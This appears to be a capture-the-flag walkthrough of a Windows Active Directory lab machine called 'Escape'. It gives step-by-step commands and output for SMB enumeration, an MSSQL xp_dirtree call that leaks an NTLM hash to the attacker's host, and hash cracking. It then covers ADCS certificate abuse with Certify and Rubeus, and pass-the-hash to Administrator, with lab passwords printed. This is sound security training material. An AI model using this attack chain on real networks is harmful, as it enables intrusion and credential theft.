# Escape

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 -Pn 10.129.242.117
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-04 06:51 EST
Nmap scan report for 10.129.242.117
Host is up (0.0078s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49689/tcp open  unknown
49690/tcp open  unknown
49710/tcp open  unknown
49714/tcp open  unknown
```

Looks like an AD machine to me. Interestingly, they made port 1433 public facing.&#x20;

### SMB Enum

We can find one share available through `smbmap`:

```
$ smbmap -u 'guest' -p '' -H 10.129.242.117
[+] IP: 10.129.242.117:445      Name: 10.129.242.117                                    
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Public                                                  READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share
```

Before checking this share out, we can enumerate the possible usernames and groups using `enum4linux` with the same credentials. We find the the domain name is called `sequel`.

```
S-1-5-21-4078382237-1492182817-2568127209-500 sequel\Administrator (Local User)              
S-1-5-21-4078382237-1492182817-2568127209-501 sequel\Guest (Local User)
S-1-5-21-4078382237-1492182817-2568127209-502 sequel\krbtgt (Local User)
S-1-5-21-4078382237-1492182817-2568127209-512 sequel\Domain Admins (Domain Group)
...
```

Checking the share out, we can find that there's one file here:

```
$ smbclient //10.129.242.117/Public -U 'guest'
Password for [WORKGROUP\guest]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Nov 19 06:51:25 2022
  ..                                  D        0  Sat Nov 19 06:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 08:39:43 2022
```

We can download this file and view it.&#x20;

### SQL Server Procedures

This is the file contents:

<figure><img src="../../../.gitbook/assets/image (4002).png" alt=""><figcaption></figcaption></figure>

The next page contains a guest login for the SQL server. We also find a user called `brandon.brown`, who is likely some kind of database administrator.&#x20;

<figure><img src="../../../.gitbook/assets/image (2859).png" alt=""><figcaption></figcaption></figure>

We can use `mssqlclient.py` to connect and interact with this database:

```
$ impacket-mssqlclient WORKGROUP/PublicUser:GuestUserCantWrite1@10.129.242.117
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL>
```

I was able to confirm that `xp_dirtree` is working on this SQL database, thus allowing us to capture hashes either via `smbserver.py` or `responder`.

Just run this within the database:

```
EXEC xp_dirtree '\\10.10.14.7\share'
```

Afterwards, we would capture an NTLM hash.

<figure><img src="../../../.gitbook/assets/image (2453).png" alt=""><figcaption></figcaption></figure>

We can try to crack this hash via whatever method available to find this password:

```
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
REGGIE1234ronnie (sql_svc)
```

With these credentials, I was able to login via `evil-winrm`.

<figure><img src="../../../.gitbook/assets/image (3232).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### SQL Logs

This user did not have the flag or any other local privileges. However, since we are an SQL user, we can perhaps read some sensitive SQL files.

Within the `C:\SQLServer\Logs` file, we can find an ERRORLOG file:

<figure><img src="../../../.gitbook/assets/image (3522).png" alt=""><figcaption></figcaption></figure>

Within that file, we can find some credentials:

```
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
```

With these credentials, we can login as `ryan.cooper`.

<figure><img src="../../../.gitbook/assets/image (160).png" alt=""><figcaption></figcaption></figure>

We can grab the user flag now.

### Certify.exe -> Admin NTLM

I ran a winPEAS scan to enumerate for me. This scan found some certificates on the machine that could potentially be the PE vector.

<figure><img src="../../../.gitbook/assets/image (2640).png" alt=""><figcaption></figcaption></figure>

We can use `certify.exe` to find out if this is vulnerable. Using `certify.exe find /vulnerable`, we can find one certificate:

<figure><img src="../../../.gitbook/assets/image (903).png" alt=""><figcaption></figcaption></figure>

We can then request for this certificate using this command:

```
.\certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator
```

This would output an RSA key and a certificate:

<figure><img src="../../../.gitbook/assets/image (1324).png" alt=""><figcaption></figcaption></figure>

Afterwards, we can simply use `openssl` to convert this output into a .pfx file:

```
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

Then, transfer the pfx file and `rubeus.exe` to the machine. We can use `asktgt` with the certificate.

<figure><img src="../../../.gitbook/assets/image (122).png" alt=""><figcaption></figcaption></figure>

Now that we have confirmed this works, we can append `/getcredentials` to the end of the Rubeus command.

<figure><img src="../../../.gitbook/assets/image (3662).png" alt=""><figcaption></figcaption></figure>

Then, just pass the hash!

<figure><img src="../../../.gitbook/assets/image (3127).png" alt=""><figcaption></figcaption></figure>
